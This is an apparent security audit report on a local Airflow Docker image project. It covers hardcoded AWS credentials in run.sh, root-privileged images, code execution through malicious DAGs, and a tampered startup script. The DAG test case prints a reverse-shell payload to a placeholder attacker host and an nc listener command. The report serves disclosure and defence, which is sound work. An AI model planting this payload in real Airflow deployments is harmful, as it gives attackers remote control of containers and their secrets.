## Combined Vulnerability List

### Vulnerability Name: AWS Credentials Exposure in `run.sh`

- Description:
    1. A user cloning the repository is instructed by the `README.md` to update the `run.sh` file located in `images/airflow/2.9.2` (and similarly for other Airflow versions).
    2. The `README.md` explicitly states: "Update `run.sh` file with your account ID, environment name and account credentials." and provides placeholders for `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`.
    3. If a user directly inputs their actual AWS credentials into these placeholder variables within the `run.sh` script, these credentials will be hardcoded in the script file.
    4. An attacker gaining access to this `run.sh` file (e.g., if inadvertently committed to a public repository, or accessible due to misconfigured permissions on a local or shared development environment) can extract these AWS credentials.
    5. These exposed AWS credentials can then be used by the attacker to gain unauthorized access to the user's AWS account.

- Impact:
    - High: Unauthorized access to the user's AWS account. Depending on the permissions associated with the exposed credentials, an attacker could potentially perform a wide range of actions, including:
        - Accessing and exfiltrating sensitive data stored in AWS services (S3, databases, etc.).
        - Modifying or deleting data and resources.
        - Launching or stopping AWS services, potentially leading to denial of service or increased AWS costs.
        - Pivoting to other AWS resources or accounts if the credentials have broader access.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - None: The project explicitly instructs users to place credentials in `run.sh` without warnings about security implications.

- Missing Mitigations:
    - Secure Credential Management Guidance: The documentation should strongly discourage hardcoding AWS credentials directly in `run.sh`.
    - Environment Variable Best Practices:  The documentation should guide users to use environment variables in a secure manner, external to the script itself, for providing AWS credentials. For local testing, suggesting methods like AWS profiles, or temporary credentials.
    - Security Warnings in README: Add prominent security warnings in the `README.md` about the dangers of hardcoding credentials and best practices for secure credential management.
    - Automated Credential Scanning: Implement a pre-commit hook or CI check that scans `run.sh` (and potentially DAG files) for patterns resembling AWS credentials and warns or blocks commits. (Although this might be bypassed, it adds a layer of defense).

- Preconditions:
    1. User follows the `README.md` instructions and hardcodes their AWS credentials directly into the `run.sh` file.
    2. The `run.sh` file with hardcoded credentials becomes accessible to an attacker. This could happen if:
        - The user inadvertently commits the `run.sh` file to a public or accessible repository.
        - The user's local development environment or shared development environment is compromised.
        - The user shares the `run.sh` file insecurely.

- Source Code Analysis:
    1. **File: `/code/README.md`**:
        - The `README.md` in the root directory contains instructions on how to use the Airflow image locally.
        - Step 3 of "Using the Airflow Image" explicitly instructs users to: "Update `run.sh` file with your account ID, environment name and account credentials."
        - It further clarifies: "Update `run.sh` file with your account ID, environment name and account credentials. The permissions associated with the provided credentials will be assigned to the Airflow components that would be started with the next step. "
        - Placeholders are provided directly within the `README.md` content, which are mirrored in the `run.sh` files.

    2. **File: `/code/images/airflow/2.10.1/run.sh` (and similar `run.sh` in other versions)**:
        ```bash
        ACCOUNT_ID="" # Put your account ID here.
        ENV_NAME="" # Choose an environment name here.
        REGION="us-west-2" # Keeping the region us-west-2 as default.

        # AWS Credentials
        AWS_ACCESS_KEY_ID="" # Put your credentials here.
        AWS_SECRET_ACCESS_KEY="" # Put your credentials here.
        AWS_SESSION_TOKEN="" # Put your credentials here.
        export AWS_ACCESS_KEY_ID
        export AWS_SECRET_ACCESS_KEY
        export AWS_SESSION_TOKEN
        ```
        - The `run.sh` script in each Airflow version directory includes commented-out placeholders for AWS credentials (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`) and explicitly instructs the user to "Put your credentials here.".
        - These variables are then immediately exported as environment variables, making them available to the Docker containers.

    **Visualization:**

    ```
    README.md --> Instructions to edit run.sh --> run.sh (with credential placeholders) --> User hardcodes credentials in run.sh --> run.sh (with hardcoded credentials) --> Potential exposure
    ```

- Security Test Case:
    1. **Setup**:
        - Clone the repository to a local machine.
        - Navigate to the directory `images/airflow/2.9.2`.
        - Edit the `run.sh` file and **intentionally** hardcode **dummy** AWS credentials in the placeholder variables:
          ```bash
          AWS_ACCESS_KEY_ID="FAKE_ACCESS_KEY"
          AWS_SECRET_ACCESS_KEY="FAKE_SECRET_KEY"
          AWS_SESSION_TOKEN="FAKE_SESSION_TOKEN"
          export AWS_ACCESS_KEY_ID
          export AWS_SECRET_ACCESS_KEY
          export AWS_SESSION_TOKEN
          ```
        - Run `./run.sh` to build and start the Docker containers. (The containers will start, although AWS functionality will likely fail with fake credentials, this step is for demonstration).
    2. **Exploit**:
        - As an attacker, assume you have gained access to the `run.sh` file (e.g., through accidental public commit, or compromised dev environment).
        - Open the `run.sh` file and read the values of `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN`.
        - In a separate terminal, use the AWS CLI configured with these extracted (dummy in this test case, but real in a vulnerable scenario) credentials to attempt to access AWS resources:
          ```bash
          aws configure set aws_access_key_id FAKE_ACCESS_KEY
          aws configure set aws_secret_access_key FAKE_SECRET_KEY
          aws configure set aws_session_token FAKE_SESSION_TOKEN
          aws configure set region us-west-2 # or the region from run.sh
          aws sts get-caller-identity # Attempt a harmless AWS API call
          ```
        - Observe that the `aws sts get-caller-identity` command (or other AWS CLI commands if using real credentials in a real attack scenario) would successfully execute (or fail due to fake credentials in this test case, but succeed with valid credentials in a real exploit), demonstrating successful credential extraction and potential unauthorized AWS access.

---

### Vulnerability Name: Privileged Docker Image User

- Description:
    - The project offers "privileged" Docker images designed for local experimentation and debugging.
    - These images are configured to run as the `root` user within the Docker container.
    - If a user were to deploy a "privileged" image in a non-development environment and expose the Airflow webserver, any exploitable code execution vulnerabilities in Airflow would then run with root privileges inside the container.
    - Step-by-step to trigger vulnerability:
      1. User builds a "privileged" Docker image (e.g., `amazon-mwaa-docker-images/airflow:2.9.2-explorer-privileged-dev`).
      2. User runs the privileged Docker image and exposes the Airflow webserver to the network.
      3. Attacker identifies and exploits a Remote Code Execution (RCE) vulnerability in the version of Apache Airflow running within the Docker image.
      4. The exploit executes arbitrary code within the Airflow container environment with root privileges.

- Impact:
    - Successful exploitation of an Airflow RCE vulnerability in a "privileged" Docker image allows an attacker to execute arbitrary code as the `root` user within the container.
    - This can lead to:
      - Full compromise of the Docker container.
      - Unauthorized access to and modification of any files within the container.
      - Installation of malicious software within the container.
      - Potential container escape and compromise of the host system, depending on Docker runtime configuration and vulnerabilities.
      - Exfiltration of sensitive data accessible within the container's environment.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - Documentation Warning: The README.md explicitly documents the "privileged" image type, stating it "run as the `root` user instead" and is "useful if the user wants to do some experiments as the root user". This serves as a documented warning against using these images in production-like scenarios.

- Missing Mitigations:
    - Stronger warnings in documentation: Enhance the README.md to more explicitly warn against deploying "privileged" images in non-development environments due to the escalated security risks.
    - Discouragement of privileged images:  Clearly discourage the use of "privileged" images except for specific local experimentation and debugging purposes.
    - Consider removing privileged images: Evaluate the necessity of providing "privileged" images and consider removing them to eliminate the risk of accidental or intentional misuse in production-like environments.

- Preconditions:
    - User builds and deploys a "privileged" Docker image.
    - The Airflow webserver within the Docker container is exposed and accessible to potential attackers.
    - A known and exploitable Remote Code Execution (RCE) vulnerability exists in the specific version of Apache Airflow deployed within the Docker image.

- Source Code Analysis:
    - README.md: Documents the existence and purpose of "privileged" images, highlighting root user execution for experimentation.
    - `/code/images/airflow/2.10.1/build.sh` (and similar `build.sh` files for other Airflow versions): Scripts that build the Docker images iterate through build types, including "explorer-privileged", and construct Dockerfile names and tags accordingly.
    - Dockerfile templates (`/code/images/airflow/2.10.1/Dockerfiles/Dockerfile-explorer-privileged-dev` and similar): These Dockerfiles, generated from `Dockerfile.derivatives.j2`, conditionally set `USER root` based on the `build_type` being "explorer-privileged".

- Security Test Case:
    1. Build a "privileged" Docker image (e.g., `amazon-mwaa-docker-images/airflow:2.9.2-explorer-privileged-dev`) using the provided `run.sh` script for the specific Airflow version.
    2. Run the built "privileged" Docker image, ensuring that port 8080 (the default Airflow webserver port) is exposed and accessible from outside the Docker host.
    3. Identify a known and publicly documented Remote Code Execution (RCE) vulnerability that affects the specific version of Apache Airflow (e.g., Airflow 2.9.2 or the version being tested). For example, research CVE databases for known RCE vulnerabilities in that Airflow version.
    4. Develop or obtain a working exploit that leverages the identified RCE vulnerability. This exploit should be designed to execute a command within the container that clearly demonstrates root privileges (e.g., a command that creates a file in the `/root` directory, which is typically only writable by the root user).
    5. Send the crafted exploit request to the exposed Airflow webserver endpoint. The exact method will depend on the specifics of the chosen Airflow RCE vulnerability (e.g., sending a malicious DAG file, crafting a specific HTTP request to a vulnerable endpoint).
    6. After sending the exploit, access a shell within the running Docker container (e.g., using `docker exec -it <container_id> bash`).
    7. Within the container shell, verify the successful execution of the exploit by checking for the expected outcome of the command (e.g., check if the file in `/root` was created, confirming root-level code execution).

---

### Vulnerability Name: Arbitrary Code Execution via Malicious DAGs

- Description:
    - An attacker can upload a malicious DAG (Directed Acyclic Graph) file, which is a Python script, through the Airflow web UI or by placing it in the `dags` folder mounted to the Docker container.
    - Airflow scheduler parses and executes DAGs to manage workflows.
    - If a DAG contains malicious Python code, this code will be executed by the Airflow components (Scheduler, Worker, or Webserver depending on where the DAG is processed or triggered) within the Docker container.
    - This can lead to arbitrary code execution within the container's environment.

- Impact:
    - Full control of the Airflow Docker container.
    - Ability to access secrets, environment variables, and data within the container.
    - Potential to pivot to other services or the host system depending on the Docker configuration and network setup.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - None. The project does not implement any mitigations against malicious DAGs. It relies on the user to upload trusted DAGs.

- Missing Mitigations:
    - DAG validation and sanitization: Implement checks to scan uploaded DAG files for potentially malicious code patterns or system calls before parsing and execution.
    - Role-Based Access Control (RBAC): While Airflow has RBAC, this project in a local development context is unlikely to have it configured strictly. Enforce proper RBAC within Airflow to limit who can upload and manage DAGs.
    - Container security hardening: Implement security best practices for the Docker container itself to limit the impact of arbitrary code execution, such as running Airflow processes with a non-root user (already implemented as user `airflow`), using minimal base images, and applying security profiles (e.g., seccomp, AppArmor).
    - Documentation and warnings: Clearly document the risk of uploading untrusted DAGs and advise users to only upload DAGs from trusted sources. While README.md mentions "Security" section, it only links to CONTRIBUTING.md, which further links to vulnerability reporting, not mitigation of DAG based attacks.

- Preconditions:
    - Access to the Airflow web UI (typically exposed on port 8080 when using `docker compose up`).
    - Ability to upload or place DAG files in the designated `dags` folder within the Docker container. In local development setup described in README.md, the `./dags` folder on host is mounted to `/usr/local/airflow/dags` in container.

- Source Code Analysis:
    - The provided project files themselves do not introduce this vulnerability, as it's inherent to Apache Airflow's design of executing user-provided Python DAGs.
    - The `README.md` provides instructions on how to run Airflow locally, which includes mounting the `./dags` directory:
    ```markdown
    volumes:
        - ./dags:/usr/local/airflow/dags
    ```
    - This mounting allows users to easily add DAG files to the Airflow environment.
    - The `docker-compose.yaml` and `docker-compose-test-commands.yaml` also define volumes including `./dags:/usr/local/airflow/dags`, confirming the intended DAG loading mechanism.
    - The Dockerfiles (`/code/images/airflow/2.9.2/Dockerfiles/Dockerfile`, etc.) use the base image `amazon-mwaa-docker-images/airflow:2.9.2-base` and set `ENTRYPOINT ["python3", "-m", "mwaa.entrypoint"]` and `CMD shell`, which starts the Airflow components. The `mwaa.entrypoint` script ( `/code/images/airflow/2.10.1/python/mwaa/entrypoint.py` ) then launches Airflow components (webserver, scheduler, worker, etc.).
    - The vulnerability lies in the design of Airflow itself, where DAGs are treated as code and executed. This project simply provides a Dockerized environment to run Airflow locally, inheriting this inherent risk if untrusted DAGs are used.

- Security Test Case:
    - Step 1: Set up the Airflow environment using the provided `run.sh` script as described in `README.md`.
    - Step 2: Create a malicious DAG file (e.g., `malicious_dag.py`) in the `./dags` directory with the following Python code:
    ```python
    from airflow import DAG
    from airflow.operators.python import PythonOperator
    from datetime import datetime

    with DAG(
        dag_id='malicious_dag',
        schedule_interval=None,
        start_date=datetime(2024, 1, 1),
        catchup=False
    ) as dag:
        def execute_malicious_code():
            import subprocess
            # Reverse shell to attacker's machine (replace with your IP and port)
            subprocess.Popen(['/bin/bash', '-c', 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1'])

        run_malicious_code = PythonOperator(
            task_id='run_malicious_code',
            python_callable=execute_malicious_code,
        )
    ```
    *(Replace `attacker_ip` and `attacker_port` with the attacker's listening IP address and port.)*
    - Step 3: Start a listener on the attacker's machine using `nc -lvnp attacker_port`.
    - Step 4: Upload `malicious_dag.py` to the Airflow instance, either by copying it to the `./dags` directory which is mounted to the container, or by using the Airflow UI if DAG upload functionality is enabled and accessible.
    - Step 5: Unpause or trigger the `malicious_dag` DAG in the Airflow Web UI (http://localhost:8080).
    - Step 6: Observe that a reverse shell connection is established on the attacker's machine, indicating successful arbitrary code execution within the Airflow Docker container.

---

### Vulnerability Name: Startup Script Command Injection

- Description:
  - An attacker could modify the `startup.sh` script within a cloned repository.
  - A user, unaware of the malicious modification, clones the repository and proceeds to run the Airflow Docker image locally as instructed in the README.
  - The `run.sh` script, used to build and run the Docker image, mounts the local `./startup` directory into the container at `/usr/local/airflow/startup`.
  - During container startup, the `entrypoint.py` script executes the `startup.sh` script located at `/usr/local/airflow/startup/startup.sh` if it exists, as configured by the `MWAA__CORE__STARTUP_SCRIPT_PATH` environment variable.
  - If the attacker has inserted malicious commands into the `startup.sh` script, these commands will be executed within the Docker container with the permissions of the container's user (airflow user by default, or root user for privileged images).

- Impact:
  - Arbitrary command execution within the Docker container.
  - Potential compromise of the local development environment.
  - Depending on the commands injected, the attacker could gain access to sensitive data, modify configurations, or further compromise the user's system from within the container.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
  - No direct mitigations are implemented in the project to prevent execution of malicious code in `startup.sh`.
  - The project relies on the user to review and secure their customized `startup.sh` script.

- Missing Mitigations:
  - Input validation or sanitization of the `startup.sh` script is missing.
  - The project could provide a secure default `startup.sh` script and explicitly warn users about the risks of customization and the importance of reviewing any modifications.
  - Documentation could be improved to highlight the security implications of modifying `startup.sh` and recommend best practices for secure customization.

- Preconditions:
  - The attacker must be able to modify the `startup.sh` script in a publicly accessible repository or trick the user into using a malicious version of the script.
  - The user must clone the repository and execute the `run.sh` script, thereby mounting and executing the potentially malicious `startup.sh` script within their Docker environment.

- Source Code Analysis:
  - In `/code/images/airflow/2.10.1/run.sh` (and similar `run.sh` files for other Airflow versions):
    ```bash
    # MWAA Configuration
    MWAA__CORE__STARTUP_SCRIPT_PATH="/usr/local/airflow/startup/startup.sh"
    export MWAA__CORE__STARTUP_SCRIPT_PATH
    ```
    This section sets the environment variable `MWAA__CORE__STARTUP_SCRIPT_PATH` to point to the `startup.sh` script within the container's `/usr/local/airflow/startup` directory.
  - In `/code/images/airflow/2.10.1/docker-compose.yaml` (and similar `docker-compose*.yaml` files for other Airflow versions):
    ```yaml
    volumes:
      - ./startup:/usr/local/airflow/startup
    ```
    This section mounts the local `./startup` directory to `/usr/local/airflow/startup` inside the Docker container.
  - In `/code/images/airflow/2.10.1/python/mwaa/entrypoint.py`:
    ```python
    def execute_startup_script(cmd: str, environ: Dict[str, str]) -> Dict[str, str]:
        """
        Execute user startup script.
        ...
        """
        startup_script_path = os.environ.get("MWAA__CORE__STARTUP_SCRIPT_PATH", "")
        ...
        if os.path.isfile(startup_script_path):
            logger.info("Executing customer startup script.")
            startup_script_process = Subprocess(
                cmd=["/bin/bash", EXECUTE_USER_STARTUP_SCRIPT_PATH], # EXECUTE_USER_STARTUP_SCRIPT_PATH is likely "execute-user-startup-script" inside the image
                env=environ,
                process_logger=PROCESS_LOGGER,
                conditions=[
                    TimeoutCondition(STARTUP_SCRIPT_MAX_EXECUTION_TIME),
                ],
                friendly_name=f"{PROCESS_LOGGER_PREFIX}_startup",
                sigterm_patience_interval=STARTUP_SCRIPT_SIGTERM_PATIENCE_INTERVAL,
            )
            startup_script_process.start()
        ...
    ```
    The `execute_startup_script` function in `entrypoint.py` retrieves the path to the startup script from the environment variable `MWAA__CORE__STARTUP_SCRIPT_PATH` and executes it using `/bin/bash execute-user-startup-script`. The `docker-compose*.yaml` files and `run.sh` scripts ensure that a user-provided `startup.sh` script in the local `./startup` directory will be mounted and subsequently executed.

- Security Test Case:
  - Step 1: Attacker modifies the `/code/images/airflow/2.10.1/startup/startup.sh` file in their forked repository to include a malicious command, for example: `echo "Malicious code executed" > /tmp/malicious.txt`.
  - Step 2: Attacker commits and pushes the changes to their forked repository.
  - Step 3: User, intending to use the legitimate repository, is tricked (e.g., via social engineering or a typo) into cloning the attacker's forked repository instead.
  - Step 4: User navigates to the airflow image directory (e.g., `/code/images/airflow/2.10.1`) and executes `./run.sh`.
  - Step 5: The Docker image is built and run, and during the startup process, the malicious `startup.sh` script from the mounted volume is executed within the container.
  - Step 6: User checks inside the running container (e.g., using `docker exec -it <container_id> bash`) and verifies that the `/tmp/malicious.txt` file has been created, confirming the execution of the malicious command.